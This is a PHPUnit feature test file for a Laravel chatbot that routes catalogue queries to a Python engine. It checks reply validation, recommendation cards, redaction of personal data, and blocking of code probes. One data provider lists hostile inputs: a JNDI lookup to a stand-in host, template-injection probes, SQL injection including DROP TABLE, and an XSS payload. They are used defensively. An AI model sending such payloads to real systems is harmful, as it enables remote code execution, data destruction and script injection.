<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Models\ChatLog;
use App\Services\AsistenteVirtualService;
use App\Services\ExportadorCatalogoAdvisor;
use App\Services\FirmaCatalogoAdvisor;
use App\Services\HorusAdvisorClient;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\Factory;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Cierre funcional (05/11/2026). Respuestas producidas por el motor Python actual sobre contenido ficticio
 * (tests/Fixtures/cierre-funcional-replies.json) atravesando la frontera Laravel existente. HTTP simulado:
 * no prueba servidores reales, MiniLM ni PostgreSQL.
 */
class HorusCierreFuncionalTest extends TestCase
{
    use RefreshDatabase;

    /** @var array{items: list<array<string, mixed>>, cases: list<array{query: string, reply: array<string, mixed>}>} */
    private array $fixture;

    private string $version;

    protected function setUp(): void
    {
        parent::setUp();
        config(['horus-advisor.enabled' => true, 'horus-advisor.url' => 'http://127.0.0.1:8001',
            'horus-advisor.token' => str_repeat('t', 32), 'horus-advisor.signing_key' => str_repeat('k', 32),
            'horus-catalog.sync_enabled' => true]);
        $this->fixture = json_decode((string) file_get_contents(base_path('tests/Fixtures/cierre-funcional-replies.json')), true, 512, JSON_THROW_ON_ERROR);
        $content = ['managed_types' => ['curso', 'servicio'], 'items' => $this->fixture['items']];
        $firma = app(FirmaCatalogoAdvisor::class);
        $catalog = ['schema_version' => '1.0', 'catalog_version' => $firma->versionContenido($content),
            'source_system' => 'horus-laravel', 'generated_at' => now()->toIso8601String(),
            'expires_at' => now()->addMinutes(5)->toIso8601String(), ...$content];
        $catalog['signature'] = $firma->firmar($catalog);
        $this->version = $catalog['catalog_version'];
        $this->mock(ExportadorCatalogoAdvisor::class)->shouldReceive('construirParaSincronizacion')->andReturn($catalog);
        Cache::forever('horus-ai.catalog.expected-version', $this->version);
    }

    /** @param array<string, mixed> $reply */
    private function fakePython(array $reply): void
    {
        Http::swap(new Factory);
        Http::preventStrayRequests();
        Http::fake(['*/ready' => Http::response(['status' => 'ready', 'knowledge' => 'loaded', 'auth' => 'configured',
            'semantic' => 'loaded', 'catalog' => 'loaded', 'catalog_version' => $this->version]),
            '*/api/v1/chat' => Http::response($reply)]);
    }

    public function test_las_respuestas_nuevas_del_motor_atraviesan_la_validacion_existente(): void
    {
        $this->assertCount(12, $this->fixture['cases']);
        foreach ($this->fixture['cases'] as $case) {
            $this->fakePython($case['reply']);
            $client = app(HorusAdvisorClient::class);
            $reply = $client->orientar($case['query']);
            $this->assertNotNull($reply, $case['query'].' / '.($client->motivoContingencia() ?? ''));
            $this->assertSame('advisor', $reply['fuente']);
            $expected = $case['reply']['answer'];
            if ($case['reply']['needs_clarification']) {
                $expected .= "\n\n".$case['reply']['clarification_question'];
            }
            $this->assertSame($expected, $reply['respuesta'], $case['query']);
            // Solo las referencias editoriales recomendadas por Python se conservan para las tarjetas.
            $this->assertSame(array_column($case['reply']['recommendations'], 'id'),
                array_column($reply['recomendaciones'] ?? [], 'id'), $case['query']);
        }
    }

    public function test_la_consulta_multitema_conserva_una_referencia_por_tema(): void
    {
        $case = collect($this->fixture['cases'])->firstWhere('query', 'Quiero aprender Excel y también necesito cableado para mi oficina');
        $this->fakePython($case['reply']);
        $reply = app(HorusAdvisorClient::class)->orientar($case['query']);
        $this->assertSame(['cat_curso_excel', 'cat_servicio_cableado'], array_column($reply['recomendaciones'], 'id'));
        $this->assertStringContainsString('Cableado estructurado', $reply['respuesta']);
    }

    public function test_la_ruta_publica_presenta_una_tarjeta_vigente_por_tema(): void
    {
        $case = collect($this->fixture['cases'])->firstWhere('query', 'Quiero aprender Excel y también necesito cableado para mi oficina');
        $this->fakePython($case['reply']);
        $respuesta = $this->postJson('/chat/mensaje', ['mensaje' => $case['query'], 'session_id' => 'cierre-tarjetas'])
            ->assertOk()->json();
        $this->assertSame('advisor', $respuesta['fuente']);
        $this->assertArrayNotHasKey('recomendaciones', $respuesta);
        $this->assertSame(['cat_curso_excel', 'cat_servicio_cableado'], array_column($respuesta['tarjetas'], 'id'));
        $this->assertSame(['curso', 'servicio'], array_column($respuesta['tarjetas'], 'tipo'));
        $this->assertSame(['Excel empresarial', 'Cableado estructurado'], array_column($respuesta['tarjetas'], 'titulo'));
        $this->assertSame(['/educacion/cursos', '/contactos'], array_column($respuesta['tarjetas'], 'url'));
        foreach ($respuesta['tarjetas'] as $tarjeta) {
            $this->assertSame($this->version, $tarjeta['procedencia']['version']);
        }
        $this->assertSame(['[contenido omitido por privacidad]'], ChatLog::query()->pluck('mensaje_usuario')->all());
    }

    public function test_un_tema_no_publicado_no_inventa_oferta_ni_repite_el_mensaje(): void
    {
        $case = collect($this->fixture['cases'])->firstWhere('query', '¿Tienen curso de cocina?');
        $this->fakePython($case['reply']);
        $reply = app(HorusAdvisorClient::class)->orientar($case['query']);
        $this->assertStringNotContainsStringIgnoringCase('cocina', $reply['respuesta']);
        $this->assertArrayNotHasKey('recomendaciones', $reply);
    }

    /** @return iterable<array{string}> */
    public static function sondasDeCodigo(): iterable
    {
        yield ['${jndi:ldap://x.example/a}'];
        yield ['{{7*7}} ¿qué cursos tienen?'];
        yield ['#{7*7}'];
        yield ["'; DROP TABLE cursos; --"];
        yield ["' OR 1=1 --"];
        yield ['<img src=x onerror=alert(1)>'];
    }

    #[DataProvider('sondasDeCodigo')]
    public function test_una_sonda_de_codigo_se_detiene_en_laravel_sin_llamar_a_python(string $mensaje): void
    {
        Http::swap(new Factory);
        Http::preventStrayRequests();
        Http::fake();
        $client = app(HorusAdvisorClient::class);
        $this->assertNull($client->orientar($mensaje));
        $this->assertSame('seguridad', $client->motivoContingencia());
        Http::assertNothingSent();
    }

    /** @return iterable<array{string}> */
    public static function consultasLegitimas(): iterable
    {
        yield ['¿Tienen curso de SQL?'];
        yield ['Quiero aprender programación en Python'];
        yield ['Soy auxiliar contable y necesito un curso de Excel financiero'];
    }

    #[DataProvider('consultasLegitimas')]
    public function test_una_consulta_legitima_sigue_llegando_al_motor(string $mensaje): void
    {
        $case = collect($this->fixture['cases'])->firstWhere('query', '¿Tienen curso de cocina?');
        $this->fakePython($case['reply']);
        $this->assertNotNull(app(HorusAdvisorClient::class)->orientar($mensaje));
        Http::assertSent(static fn (Request $r): bool => str_ends_with($r->url(), '/api/v1/chat') && $r['message'] === $mensaje);
    }

    public function test_un_nombre_junto_a_una_ocupacion_se_bloquea_por_completo_en_la_ruta_publica(): void
    {
        Http::swap(new Factory);
        Http::preventStrayRequests();
        Http::fake();
        $mensaje = 'Soy auxiliar Ernesto Quispilloclla y quiero el curso';
        $resultado = app(AsistenteVirtualService::class)->procesarMensaje($mensaje, 'cierre-funcional');
        $this->assertSame(AsistenteVirtualService::RESPUESTA_PRIVACIDAD, $resultado['respuesta']);
        Http::assertNothingSent();
        $this->assertSame(['[contenido omitido por privacidad]'], ChatLog::query()->pluck('mensaje_usuario')->all());
        $this->assertStringNotContainsString('Quispilloclla', ChatLog::query()->get()->toJson());
    }
}
